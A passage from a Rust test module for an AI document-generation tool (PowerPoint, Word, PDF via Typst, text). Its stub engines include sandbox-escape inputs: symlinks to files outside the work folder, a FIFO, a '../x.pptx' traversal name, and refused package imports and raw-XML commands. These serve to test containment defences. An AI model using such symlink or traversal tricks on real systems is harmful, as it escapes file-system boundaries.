*) printf '%%PDF-1.7\n1 0 obj << /Type /Page >>\n2 0 obj << /Type /Pages /Count 1 >>\n3 0 obj << /Type /Page>>\n' > "$last" ;;
esac"#;

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn create_pptx_runs_batch_and_imports_attachment() {
        let f = fixture(
            Some(&officecli(
                r#"{"results":[{"index":0,"success":true}]}"#,
                NO_ISSUES,
                r#"{"slides":3}"#,
            )),
            None,
        );
        let result = f
            .call(
                "call-1",
                json!({"name": "Plan.pptx", "format": "pptx", "content": deck()}),
            )
            .await
            .unwrap();
        assert_eq!(result["status"], "completed");
        assert_eq!(result["file"]["mimeType"], PPTX);
        assert_eq!(result["file"]["name"], "Plan.pptx");
        assert_eq!(result["file"]["slides"], 3);
        assert_eq!(result["issues"], json!([]));
        let file = PathBuf::from(result["filePath"].as_str().unwrap());
        assert!(file.is_absolute() && file.is_file());
        let preview = PathBuf::from(result["previewPath"].as_str().unwrap());
        assert_eq!(preview, file.with_file_name("pages").join("1.svg"));
        assert!(preview.is_file());
        // officecli got the batch as the model wrote it.
        let seen: Value =
            serde_json::from_slice(&std::fs::read(file.with_file_name("batch-seen.json")).unwrap())
                .unwrap();
        assert_eq!(seen, deck());

        let record = f.record();
        let attachment = record
            .attachments
            .iter()
            .find(|a| a.origin.as_deref() == Some("generated"))
            .unwrap();
        assert_eq!(result["file"]["id"], attachment.id);
        assert_eq!(attachment.mime_type, PPTX);
        let reply = &record.messages[0];
        let generation = reply.media_for(Some("call-1")).unwrap();
        assert_eq!(generation.kind, "document");
        assert_eq!(generation.status, "completed");
        assert_eq!(generation.cost.as_deref(), Some("0"));
        assert_eq!(generation.outputs, vec![attachment.id.clone()]);
        assert_eq!(generation.params["format"], "pptx");
        assert_eq!(generation.params["slides"], 3);
        assert_eq!(generation.params["issues"], json!([]));
        let events = f.events("generation");
        assert_eq!(events.len(), 1);
        assert_eq!(events[0]["generation"]["kind"], "document");
        assert_eq!(events[0]["attachments"][0]["id"], attachment.id);
    }

    /// The slide pictures kept beside the generated attachment, by name,
    /// with their text.
    fn kept_pages(f: &Fixture, result: &Value) -> Vec<(String, String)> {
        let id = result["file"]["id"].as_str().unwrap();
        let dir = f
            .host
            .store(&identity().owner)
            .unwrap()
            .attachment_root(&f.sid)
            .unwrap()
            .join(format!("{id}.pages"));
        if !dir.exists() {
            return vec![];
        }
        let mut pages: Vec<(String, String)> = std::fs::read_dir(dir)
            .unwrap()
            .map(|entry| {
                let path = entry.unwrap().path();
                let name = path.file_name().unwrap().to_string_lossy().into_owned();
                (name, std::fs::read_to_string(&path).unwrap())
            })
            .collect();
        pages.sort();
        pages
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn every_slide_gets_an_svg_page() {
        let f = fixture(
            Some(&officecli_drawing(
                r#"{"results":[{"index":0,"success":true}]}"#,
                NO_ISSUES,
                r#"{"slides":3}"#,
                r#"echo "<svg>$4 $5 $6 $7</svg>""#,
            )),
            None,
        );
        let result = f
            .call(
                "call-1",
                json!({"name": "Plan.pptx", "format": "pptx", "content": deck()}),
            )
            .await
            .unwrap();
        assert_eq!(result["issues"], json!([]));
        assert_eq!(result["svgPages"], 3);
        let pages = PathBuf::from(result["filePath"].as_str().unwrap()).with_file_name("pages");
        for n in 1..=3 {
            assert_eq!(
                std::fs::read_to_string(pages.join(format!("{n}.svg"))).unwrap(),
                format!("<svg>--start {n} --end {n}</svg>")
            );
        }
        // The runtime's thumbnail is the first page.
        assert_eq!(result["previewPath"], json!(pages.join("1.svg")));
        let record = f.record();
        let generation = record.messages[0].media_for(Some("call-1")).unwrap();
        assert_eq!(generation.params["svgPages"], 3);
        let kept = kept_pages(&f, &result);
        assert_eq!(
            kept.iter()
                .map(|(name, _)| name.as_str())
                .collect::<Vec<_>>(),
            ["1.svg", "2.svg", "3.svg"]
        );
        assert_eq!(kept[1].1, "<svg>--start 2 --end 2</svg>");
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn an_oversized_page_is_skipped_with_a_warning() {
        // Slide 2 is 300 KiB: more than the runner keeps of an engine's output.
        let svg = r#"if [ "$5" = 2 ]; then printf '<svg>'; head -c 307200 /dev/zero | tr '\0' x; echo '</svg>'; else echo "<svg>$5</svg>"; fi"#;
        let f = fixture(
            Some(&officecli_drawing(
                r#"{"results":[{"index":0,"success":true}]}"#,
                NO_ISSUES,
                r#"{"slides":3}"#,
                svg,
            )),
            None,
        );
        let result = f
            .call(
                "call-1",
                json!({"name": "Plan.pptx", "format": "pptx", "content": deck()}),
            )
            .await
            .unwrap();
        assert_eq!(result["status"], "completed");
        assert_eq!(
            result["issues"],
            json!([{"severity": "warning", "message": "slide 2 has no preview", "path": "/slide[2]"}])
        );
        assert_eq!(result["svgPages"], 2);
        let pages = PathBuf::from(result["filePath"].as_str().unwrap()).with_file_name("pages");
        assert!(pages.join("1.svg").is_file() && pages.join("3.svg").is_file());
        assert!(!pages.join("2.svg").exists());
        assert_eq!(
            kept_pages(&f, &result),
            [
                ("1.svg".to_owned(), "<svg>1</svg>".to_owned()),
                ("3.svg".to_owned(), "<svg>3</svg>".to_owned()),
            ]
        );
    }

    /// A deck of three slides made by `officecli` (see [`officecli_drawing`]
    /// for `svg`): its fixture and the result.
    async fn drawn_deck(svg: &str) -> (Fixture, Value) {
        let f = fixture(
            Some(&officecli_drawing(
                r#"{"results":[{"index":0,"success":true}]}"#,
                NO_ISSUES,
                r#"{"slides":3}"#,
                svg,
            )),
            None,
        );
        let result = f
            .call(
                "call-1",
                json!({"name": "Plan.pptx", "format": "pptx", "content": deck()}),
            )
            .await
            .unwrap();
        assert_eq!(result["status"], "completed", "{result}");
        assert_eq!(f.record().attachments.len(), 1, "the document is kept");
        (f, result)
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn an_engine_that_cannot_run_ends_the_export() {
        // Drawing slide 1, the engine removes itself: slide 2 cannot start,
        // and slide 3 is not tried.
        let svg = r#"[ "$5" = 1 ] && rm -- "$0"; echo "<svg>$5</svg>""#;
        let (f, result) = drawn_deck(svg).await;
        assert_eq!(
            result["issues"],
            json!([{"severity": "warning", "message": "slides 2-3 have no preview"}])
        );
        assert_eq!(result["svgPages"], 1);
        let pages = PathBuf::from(result["filePath"].as_str().unwrap()).with_file_name("pages");
        assert_eq!(result["previewPath"], json!(pages.join("1.svg")));
        assert_eq!(
            kept_pages(&f, &result),
            [("1.svg".to_owned(), "<svg>1</svg>".to_owned())]
        );
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn a_page_the_engine_replaces_is_not_kept() {
        let outside = tempfile::tempdir().unwrap();
        let secret = outside.path().join("secret.svg");
        std::fs::write(&secret, "<svg>secret</svg>").unwrap();
        // Drawing slide 2, page 1 becomes a link to a file outside; drawing
        // slide 3, page 2 becomes a pipe.
        let svg = format!(
            r#"case "$5" in
    2) rm -f pages/1.svg; ln -s '{}' pages/1.svg ;;
    3) rm -f pages/2.svg; mkfifo pages/2.svg ;;
    esac; echo "<svg>$5</svg>""#,
            secret.display()
        );
        let (f, result) = drawn_deck(&svg).await;
        assert_eq!(
            result["issues"],
            json!([
                {"severity": "warning", "message": "slide 1 has no preview", "path": "/slide[1]"},
                {"severity": "warning", "message": "slide 2 has no preview", "path": "/slide[2]"},
            ])
        );
        assert_eq!(result["svgPages"], 1);
        assert!(result["previewPath"].is_null());
        assert_eq!(
            kept_pages(&f, &result),
            [("3.svg".to_owned(), "<svg>3</svg>".to_owned())]
        );
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn a_pages_link_is_not_written_through() {
        let outside = tempfile::tempdir().unwrap();
        // The batch leaves `pages` as a link to a folder outside.
        let stub = format!(
            r#"case "$1" in
create) printf 'PK\003\004stub' > "$2" ;;
batch) ln -s '{}' pages; echo '{{"results":[{{"index":0,"success":true}}]}}' ;;
validate) echo '{{"valid":true}}' ;;
view) case "$3" in
  issues) echo '{NO_ISSUES}' ;;
  stats) echo '{{"slides":2}}' ;;
  svg) echo "<svg>$5</svg>" ;;
  esac ;;
esac"#,
            outside.path().display()
        );
        let f = fixture(Some(&stub), None);
        let result = f
            .call(
                "call-1",
                json!({"name": "Plan.pptx", "format": "pptx", "content": deck()}),
            )
            .await
            .unwrap();
        assert_eq!(result["status"], "completed", "{result}");
        assert_eq!(
            result["issues"],
            json!([{"severity": "warning", "message": "slides 1-2 have no preview"}])
        );
        assert_eq!(result["svgPages"], 0);
        assert!(result["previewPath"].is_null());
        assert!(kept_pages(&f, &result).is_empty());
        assert_eq!(std::fs::read_dir(outside.path()).unwrap().count(), 0);
    }

    /// A deck of more than MAX_SVG_PAGES slides draws only that many, and
    /// says once which slides have no picture.
    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn at_most_sixty_slides_are_drawn() {
        let f = fixture(
            Some(&officecli_drawing(
                r#"{"results":[{"index":0,"success":true}]}"#,
                NO_ISSUES,
                r#"{"slides":70}"#,
                r#"echo "$5" >> svg.calls; echo "<svg>$5</svg>""#,
            )),
            None,
        );
        let result = f
            .call(
                "call-1",
                json!({"name": "Plan.pptx", "format": "pptx", "content": deck()}),
            )
            .await
            .unwrap();
        assert_eq!(result["status"], "completed", "{result}");
        assert_eq!(result["file"]["slides"], 70);
        assert_eq!(result["svgPages"], 60);
        assert_eq!(
            result["issues"],
            json!([{"severity": "warning", "message": "slides 61-70 have no preview"}])
        );
        let file = PathBuf::from(result["filePath"].as_str().unwrap());
        let drawn = calls(&file, "svg.calls");
        assert_eq!(drawn.lines().count(), 60);
        assert_eq!(drawn.lines().last(), Some("60"));
        assert_eq!(kept_pages(&f, &result).len(), 60);
    }

    /// Slide pictures that cannot be kept beside the attachment (here a
    /// file already holds the place of its pages folder) are not counted:
    /// the document stands, with `svgPages` 0 in the result, the record and
    /// the attachment's details.
    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn pages_that_cannot_be_kept_are_not_counted() {
        // The attachment takes the id of the folder the engine works in,
        // so the stand-in can put a file where its pages folder goes.
        let svg = r#"mkdir -p ../../attachments; : > "../../attachments/$(basename "$PWD").pages"; echo "<svg>$5</svg>""#;
        let (f, result) = drawn_deck(svg).await;
        assert_eq!(result["issues"], json!([]));
        assert_eq!(result["svgPages"], 0);
        // The runtime's thumbnail is drawn all the same.
        let pages = PathBuf::from(result["filePath"].as_str().unwrap()).with_file_name("pages");
        assert_eq!(result["previewPath"], json!(pages.join("1.svg")));
        let id = result["file"]["id"].as_str().unwrap();
        let store = f.host.store(&identity().owner).unwrap();
        let blocked = store
            .attachment_root(&f.sid)
            .unwrap()
            .join(format!("{id}.pages"));
        assert!(blocked.is_file(), "nothing was written in its place");
        let record = f.record();
        let generation = record.messages[0].media_for(Some("call-1")).unwrap();
        assert_eq!(generation.params["svgPages"], 0);
        assert_eq!(generation.outputs, vec![id.to_owned()]);
        for attachment in [&record.attachments[0], &record.messages[0].attachments[0]] {
            assert_eq!(attachment.id, id);
            assert_eq!(attachment.details.as_ref().unwrap()["svgPages"], 0);
        }
        let events = f.events("generation");
        assert_eq!(events[0]["generation"]["params"]["svgPages"], 0);
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn a_literal_backslash_n_in_text_is_a_newline() {
        let f = fixture(
            Some(&officecli(
                r#"{"results":[{"index":0,"success":true},{"index":1,"success":true}]}"#,
                NO_ISSUES,
                r#"{"slides":1}"#,
            )),
            None,
        );
        let content = json!([
            {"command": "add", "parent": "/", "type": "slide", "props": {"title": "Hi"}},
            {"command": "add", "parent": "/slide[1]", "type": "shape", "props": {
                "text": "A\\nB\\r\\nC", "notes": "x\\ny", "alt": "Keep\\nAlt"
            }}
        ]);
        let result = f
            .call(
                "call-1",
                json!({"name": "Plan.pptx", "format": "pptx", "content": content}),
            )
            .await
            .unwrap();
        assert_eq!(result["status"], "completed", "{result}");
        let file = PathBuf::from(result["filePath"].as_str().unwrap());
        let seen: Value =
            serde_json::from_slice(&std::fs::read(file.with_file_name("batch-seen.json")).unwrap())
                .unwrap();
        assert_eq!(seen[1]["props"]["text"], "A\nB\nC");
        assert_eq!(seen[1]["props"]["notes"], "x\ny");
        assert_eq!(seen[1]["props"]["alt"], "Keep\\nAlt");
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn create_pptx_reports_batch_failures_without_attachment() {
        let f = fixture(
            Some(&officecli(
                r#"{"results":[{"index":0,"success":true},{"index":1,"success":false,"code":"invalid_path","output":"Slide 5 not found. Run `help batch` for the JSON item schema."}],"atomicRolledBack":true}"#,
                NO_ISSUES,
                r#"{"slides":1}"#,
            )),
            None,
        );
        let error = f
            .call(
                "call-1",
                json!({"name": "deck", "format": "pptx", "content": deck()}),
            )
            .await
            .unwrap_err();
        assert_eq!(code(&error), FAILED);
        let failure = body(&error);
        assert_eq!(failure["items"][0]["index"], 1);
        assert_eq!(failure["items"][0]["code"], "invalid_path");
        assert_eq!(failure["items"][0]["output"], "Slide 5 not found.");
        assert!(failure["message"].as_str().unwrap().contains("1 of 2"));
        let record = f.record();
        assert!(record.attachments.is_empty());
        assert!(record.messages[0].generations.is_empty());
        assert!(f.events("generation").is_empty());
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn batch_failures_fit_the_runtime_error_text() {
        let failures: Vec<Value> = (0..9)
            .map(|index| json!({"index": index, "success": false, "error": "x".repeat(900), "code": "invalid_value"}))
            .collect();
        let batch = json!({"success": false, "data": {"results": failures, "summary": {"failed": 9, "atomicRolledBack": true}}});
        let f = fixture(Some(&officecli(&batch.to_string(), NO_ISSUES, "{}")), None);
        let error = f
            .call(
                "call-1",
                json!({"name": "deck", "format": "docx", "content": deck()}),
            )
            .await
            .unwrap_err();
        // The runtime passes the model at most 2000 characters of it.
        assert!(error.chars().count() <= 2000, "{}", error.len());
        let failure = body(&error);
        let items = failure["items"].as_array().unwrap();
        assert_eq!(items.len(), 5);
        assert!(items
            .iter()
            .all(|item| item.to_string().chars().count() <= 300));
        assert!(failure["message"].as_str().unwrap().contains("9 of 9"));
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn batch_warnings_and_unsupported_properties_become_issues() {
        let batch = json!({"success": true, "data": {"results": [
            {"index": 0, "success": true, "output": "Added paragraph at /body/p[@paraId=1]",
             "warnings": [
                {"message": "style 'Heading1' was not defined in the styles part; added Word's built-in definition", "code": "advisory"},
                {"message": "[Schema] invalid child element", "code": "validation_error"},
             ]},
            {"index": 1, "success": true, "output": "Added shape at /slide[1]/shape[@id=100000]\nWARNING: UNSUPPORTED props: color (did you mean fill?). Run 'officecli help <format> <element>' to see valid props, or raw-set for raw XML."},
            {"index": 2, "success": true, "warning": "text was trimmed"},
        ], "summary": {"failed": 0}}});
        let f = fixture(Some(&officecli(&batch.to_string(), NO_ISSUES, "{}")), None);
        let result = f
            .call(
                "call-1",
                json!({"name": "deck", "format": "pptx", "content": deck()}),
            )
            .await
            .unwrap();
        let issues = result["issues"].as_array().unwrap();
        let messages: Vec<&str> = issues
            .iter()
            .map(|i| i["message"].as_str().unwrap())
            .collect();
        assert_eq!(
            messages,
            [
                "item 0: [Schema] invalid child element",
                "item 1: UNSUPPORTED props: color (did you mean fill?).",
                "item 2: text was trimmed",
            ]
        );
        assert!(issues.iter().all(|i| i["severity"] == "warning"));
        assert_eq!(issues[1]["path"], "/slide[1]/shape[@id=100000]");
        // The card keeps them too.
        let record = f.record();
        let generation = record.messages[0].media_for(Some("call-1")).unwrap();
        assert_eq!(generation.params["issues"], result["issues"]);
        assert_eq!(
            record.attachments[0].details.as_ref().unwrap()["issues"],
            result["issues"]
        );
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn repeated_advisories_collapse_and_errors_come_first() {
        let mut found: Vec<Value> = (0..14)
            .map(|i| json!({"severity": 1, "path": format!("/body/p[{i}]"), "message": "Body paragraph missing first-line indent"}))
            .collect();
        found.push(json!({"severity": 0, "path": "Sheet1!A1", "message": "Formula references missing sheet"}));
        let issues = json!({"success": true, "data": {"count": 15, "issues": found}});
        let f = fixture(
            Some(&officecli(
                r#"{"results":[{"index":0,"success":true}]}"#,
                &issues.to_string(),
                "{}",
            )),
            None,
        );
        let result = f
            .call(
                "call-1",
                json!({"name": "memo", "format": "docx", "content": deck()}),
            )
            .await
            .unwrap();
        assert_eq!(
            result["issues"],
            json!([
                {"severity": "error", "message": "Formula references missing sheet", "path": "Sheet1!A1"},
                {"severity": "warning", "message": "Body paragraph missing first-line indent (14 places)"},
            ])
        );
        // A Word file reports no count.
        assert!(result["file"].get("slides").is_none());
        assert!(result["file"].get("pages").is_none());
        assert!(result["previewPath"].is_null());
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn an_issues_report_that_does_not_parse_is_not_zero_issues() {
        // Cut by the output limit, not JSON, or without its list.
        for report in [
            r#"{"success":true,"data":{"count":250,"issues":[{"severity":1,"#,
            "not json",
            r#"{"success":false}"#,
        ] {
            let f = fixture(
                Some(&officecli(
                    r#"{"results":[{"index":0,"success":true}]}"#,
                    report,
                    "{}",
                )),
                None,
            );
            let result = f
                .call(
                    "call-1",
                    json!({"name": "memo", "format": "docx", "content": deck()}),
                )
                .await
                .unwrap();
            assert_eq!(
                result["issues"],
                json!([{"severity": "warning", "message": ISSUES_UNAVAILABLE}]),
                "{report}"
            );
        }
        let f = fixture(
            Some(&officecli(
                r#"{"results":[{"index":0,"success":true}]}"#,
                NO_ISSUES,
                "{}",
            )),
            None,
        );
        let result = f
            .call(
                "call-1",
                json!({"name": "memo", "format": "docx", "content": deck()}),
            )
            .await
            .unwrap();
        assert_eq!(result["issues"], json!([]));
        assert_eq!(VIEW_ISSUES_LIMIT, "200");
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn create_pdf_compiles_with_prelude_and_preview() {
        let f = fixture(None, Some(TYPST_OK));
        let body = "= Title\n\nHello.\n\n= Second\n\nMore.";
        let result = f
            .call(
                "call-1",
                json!({"name": "report.pdf", "format": "pdf", "content": body}),
            )
            .await
            .unwrap();
        assert_eq!(result["status"], "completed");
        assert_eq!(result["file"]["mimeType"], "application/pdf");
        assert_eq!(result["issues"], json!([]));
        // The runtime counts the pages for the model.
        assert!(result["file"].get("pages").is_none());
        let file = PathBuf::from(result["filePath"].as_str().unwrap());
        let main = std::fs::read_to_string(file.with_file_name("main.typ")).unwrap();
        let prelude = include_str!("pdf-prelude.typ").replace("{{LANG}}", "en");
        assert!(main.starts_with(&prelude));
        assert!(main.ends_with(body));
        assert!(main.contains(r#"lang: "en""#));
        let preview = PathBuf::from(result["previewPath"].as_str().unwrap());
        assert_eq!(preview.file_name().unwrap(), "preview-1.png");
        assert!(preview.is_file());
        // Packages cannot be fetched into the engine's folder, and the body
        // reads nothing outside the document's folder.
        assert!(!file.with_file_name("packages-writable").exists());
        let args = std::fs::read_to_string(file.with_file_name("typst-args")).unwrap();
        assert!(args
            .lines()
            .all(|line| line.starts_with("compile --root . --diagnostic-format short")));
        // The card counts the page dictionaries, not the page tree.
        let record = f.record();
        let generation = record.messages[0].media_for(Some("call-1")).unwrap();
        assert_eq!(generation.params["pages"], 2);
        assert_eq!(record.attachments[0].details.as_ref().unwrap()["pages"], 2);
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn a_documents_folder_stays_for_the_call_and_goes_when_the_run_ends() {
        let f = fixture(None, Some(TYPST_OK));
        let result = f
            .call(
                "call-1",
                json!({"name": "report", "format": "pdf", "content": "= Hi"}),
            )
            .await
            .unwrap();
        // The runtime reads the preview once the call has answered.
        let file = PathBuf::from(result["filePath"].as_str().unwrap());
        let preview = PathBuf::from(result["previewPath"].as_str().unwrap());
        assert!(file.is_file() && preview.is_file());
        assert_eq!(f.outputs().len(), 1);

        f.host.finish(&f.run, Ok(Finish::Completed)).await;
        assert!(f.outputs().is_empty());
        assert!(!file.exists() && !preview.exists());
        // The reply keeps the document: its copy is an attachment.
        let record = f.record();
        let attachment = &record.attachments[0];
        assert_eq!(attachment.origin.as_deref(), Some("generated"));
        let kept = f
            .host
            .store(&identity().owner)
            .unwrap()
            .attachment_root(&f.sid)
            .unwrap()
            .join(&attachment.id);
        assert!(kept.is_file());
        assert_eq!(f.events("run_end").len(), 1);
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn the_folders_of_failed_and_text_documents_go_when_a_run_stops() {
        let f = fixture(
            None,
            Some("echo 'error: expected closing bracket' >&2; exit 1"),
        );
        f.call(
            "call-1",
            json!({"name": "report", "format": "pdf", "content": "#text("}),
        )
        .await
        .unwrap_err();
        f.call(
            "call-2",
            json!({"name": "notes", "format": "md", "content": "# Hi"}),
        )
        .await
        .unwrap();
        // A call refused before it made a folder leaves none.
        f.call(
            "call-3",
            json!({"name": "a", "format": "pptx", "content": deck()}),
        )
        .await
        .unwrap_err();
        assert_eq!(f.outputs().len(), 2);

        f.host.finish(&f.run, Ok(Finish::Stopped)).await;
        assert!(f.outputs().is_empty());
        assert_eq!(f.events("run_end").len(), 1);
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn a_folder_that_cannot_be_removed_does_not_fail_the_run() {
        use std::os::unix::fs::PermissionsExt;
        let f = fixture(None, Some(TYPST_OK));
        let result = f
            .call(
                "call-1",
                json!({"name": "report", "format": "pdf", "content": "= Hi"}),
            )
            .await
            .unwrap();
        // A locked folder cannot be emptied.
        let dir = PathBuf::from(result["filePath"].as_str().unwrap())
            .parent()
            .unwrap()
            .to_path_buf();
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o500)).unwrap();

        f.host.finish(&f.run, Ok(Finish::Completed)).await;
        // (Gone already when the tests run as root.)
        let _ = std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700));
        // The run still ended, with its reply saved.
        assert_eq!(f.events("run_end").len(), 1);
        assert_eq!(f.record().messages[0].status, "completed");
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn create_pdf_returns_compiler_errors() {
        let f = fixture(
            None,
            Some("echo 'error: expected closing bracket' >&2; exit 1"),
        );
        let error = f
            .call(
                "call-1",
                json!({"name": "report", "format": "pdf", "content": "#text("}),
            )
            .await
            .unwrap_err();
        assert_eq!(code(&error), FAILED);
        assert!(error.contains("error: expected closing bracket"), "{error}");
        assert!(f.record().attachments.is_empty());
        assert!(f.events("generation").is_empty());
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn typst_lines_count_from_the_body_and_font_noise_is_dropped() {
        let prelude = include_str!("pdf-prelude.typ").lines().count();
        let script = format!(
            r#"for a; do last=$a; done
echo 'main.typ:2:16: warning: unknown font family: microsoft yahei' >&2
echo 'main.typ:{body2}:3: warning: unknown font family: comic sans' >&2
echo 'main.typ:{body3}:5: warning: block may not occur inside of a paragraph' >&2
case " $* " in
*" --format png "*) exit 0 ;;
*) printf '%%PDF-1.7 /Type /Page' > "$last" ;;
esac"#,
            body2 = prelude + 2,
            body3 = prelude + 3,
        );
        let f = fixture(None, Some(&script));
        let result = f
            .call(
                "call-1",
                json!({"name": "r", "format": "pdf", "content": "a\nb\nc"}),
            )
            .await
            .unwrap();
        assert_eq!(
            result["issues"],
            json!([{"severity": "warning", "message": "block may not occur inside of a paragraph", "path": "line 3, column 5"}])
        );
        // A first page that did not render leaves no preview.
        assert!(result["previewPath"].is_null());

        let script = format!(
            "echo 'main.typ:{}:7: error: unclosed delimiter' >&2; echo 'main.typ:1:1: error: in the prelude' >&2; exit 1",
            prelude + 2
        );
        let f = fixture(None, Some(&script));
        let error = f
            .call("call-1", json!({"name": "r", "format": "pdf", "content": "fine\n#text(fill: red)[open\nend"}))
            .await
            .unwrap_err();
        assert!(
            error
                .contains("line 2, column 7: error: unclosed delimiter\n    #text(fill: red)[open"),
            "{error}"
        );
        assert!(!error.contains(&format!("{}:", prelude + 2)), "{error}");
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn typst_packages_are_refused_before_compiling() {
        let f = fixture(None, Some("echo ran > ran; exit 1"));
        for body in [
            "#import \"@preview/cetz:0.3.0\": canvas\nHi",
            "#include  \"@local/notes:1.0.0\"",
            "#{ import \"@acme/x:1.0.0\" }",
            "see @preview/thing",
        ] {
            let error = f
                .call(
                    &id(),
                    json!({"name": "r", "format": "pdf", "content": body}),
                )
                .await
                .unwrap_err();
            assert_eq!(code(&error), FAILED, "{body}");
            assert!(error.contains("package"), "{error}");
        }
        assert!(f.outputs().iter().all(|dir| !dir.join("ran").exists()));
        // An address in the text is no import.
        let f = fixture(None, Some(TYPST_OK));
        f.call(
            "call-1",
            json!({"name": "r", "format": "pdf", "content": "Mail me at a\\@example.com"}),
        )
        .await
        .unwrap();
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn create_text_writes_directly() {
        // An engine that ran would leave a mark.
        let f = fixture(
            Some("echo ran > ran; exit 9"),
            Some("echo ran > ran; exit 9"),
        );
        let result = f
            .call(
                "call-1",
                json!({"name": "notes.txt", "format": "md", "content": "# Notes\n\n- one\n"}),
            )
            .await
            .unwrap();
        assert_eq!(result["file"]["name"], "notes.md");
        assert_eq!(result["file"]["mimeType"], "text/markdown");
        assert_eq!(result["file"]["bytes"], 15);
        assert!(result["previewPath"].is_null());
        let record = f.record();
        let attachment = &record.attachments[0];
        assert_eq!(attachment.mime_type, "text/markdown");
        let copy = f
            .host
            .store(&identity().owner)
            .unwrap()
            .attachment_root(&f.sid)
            .unwrap()
            .join(&attachment.id);
        assert_eq!(std::fs::read(copy).unwrap(), b"# Notes\n\n- one\n");
        let generation = record.messages[0].media_for(Some("call-1")).unwrap();
        assert_eq!(
            generation.params,
            json!({"name": "notes.md", "format": "md", "issues": []})
        );
        assert!(f.outputs().iter().all(|dir| !dir.join("ran").exists()));
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn rejects_bad_names_and_oversized_content() {
        let f = fixture(None, None);
        let result = f
            .call(
                "call-1",
                json!({"name": "../x.pptx", "format": "csv", "content": "a,b\n"}),
            )
            .await
            .unwrap();
        assert_eq!(result["file"]["name"], "x.csv");
        let error = f
            .call(
                "call-2",
                json!({"name": "big", "format": "txt", "content": "x".repeat(2_200_000)}),
            )
            .await
            .unwrap_err();
        assert_eq!(code(&error), TOO_LARGE);
        // A refused document does not count against the reply.
        for call in ["call-3", "call-4"] {
            f.call(call, json!({"name": "n", "format": "txt", "content": "x"}))
                .await
                .unwrap();
        }
        let error = f
            .call(
                "call-5",
                json!({"name": "n", "format": "txt", "content": "x"}),
            )
            .await
            .unwrap_err();
        assert_eq!(code(&error), LIMIT);
        assert_eq!(f.record().attachments.len(), 3);
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn rejects_content_of_the_wrong_shape() {
        let f = fixture(Some("exit 9"), Some("exit 9"));
        for (args, why) in [
            (
                json!({"name": "a", "format": "pptx", "content": "text"}),
                "array",
            ),
            (
                json!({"name": "a", "format": "pdf", "content": []}),
                "string",
            ),
            (
                json!({"name": "a", "format": "json", "content": [{"command": "add"}]}),
                "string",
            ),
            (
                json!({"name": "a", "format": "docx", "content": [{"path": "/"}]}),
                "command",
            ),
            (
                json!({"name": "a", "format": "xlsx", "content": []}),
                "command",
            ),
            (
                json!({"name": "a", "format": "xlsx", "content": vec![json!({"command": "set"}); 2001]}),
                "2000",
            ),
            (
                json!({"name": "a", "format": "rtf", "content": "x"}),
                "malformed",
            ),
            (
                json!({"name": "a", "format": "txt", "content": "x", "extra": 1}),
                "malformed",
            ),
        ] {
            let error = f.call(&id(), args.clone()).await.unwrap_err();
            assert_eq!(code(&error), FAILED, "{args}");
            assert!(error.contains(why), "{error}");
        }
        assert!(f.outputs().is_empty());
    }

    /// Each of `items` alone as a pptx batch: its refusal.
    async fn refused(f: &Fixture, items: &[Value]) -> Vec<String> {
        let mut errors = vec![];
        for item in items {
            let content = json!([{"command": "add", "parent": "/", "type": "slide"}, item]);
            let error = f
                .call(
                    &id(),
                    json!({"name": "a", "format": "pptx", "content": content}),
                )
                .await
                .unwrap_err();
            assert_eq!(code(&error), FAILED, "{item}");
            assert!(error.contains("item 1:"), "{error}");
            errors.push(error);
        }
        errors
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn batches_hold_only_commands_that_change_the_document() {
        let f = fixture(Some("echo ran > ran; exit 9"), None);
        let errors = refused(
            &f,
            &[
                json!({"command": "raw-set", "part": "/document", "xpath": "//w:body", "action": "append", "xml": "<x/>"}),
                json!({"command": "add-part", "parent": "/"}),
                json!({"command": "raw", "part": "/document"}),
                json!({"command": "dump", "path": "/"}),
                json!({"command": "view", "mode": "screenshot"}),
                json!({"command": "validate"}),
                json!({"command": "get", "path": "/"}),
                json!({"command": "query", "selector": "shape"}),
                json!({"command": "import", "parent": "/Sheet1", "text": "a,b"}),
                json!({"op": "VIEW", "mode": "html"}),
                json!({"command": "add", "op": "remove", "parent": "/"}),
            ],
        )
        .await;
        assert!(
            errors[0].contains("\"raw-set\" is not available"),
            "{}",
            errors[0]
        );
        let errors = refused(
            &f,
            &[
                json!({"command": "add", "parent": "/", "type": "slide", "xml": "<p:sld/>"}),
                json!({"command": "set", "path": "/slide[1]", "text": "x"}),
            ],
        )
        .await;
        assert!(errors[0].contains("unknown field \"xml\""), "{}", errors[0]);
        // officecli's alias and each command's own fields are fine.
        let f = fixture(
            Some(&officecli(
                r#"{"results":[{"index":0,"success":true}]}"#,
                NO_ISSUES,
                "{}",
            )),
            None,
        );
        let content = json!([
            {"op": "add", "parent": "/", "type": "slide", "index": 0},
            {"command": "move", "path": "/slide[1]/shape[1]", "to": "/slide[2]", "after": "/slide[2]/shape[1]"},
            {"command": "swap", "path": "/slide[1]", "path2": "/slide[2]"},
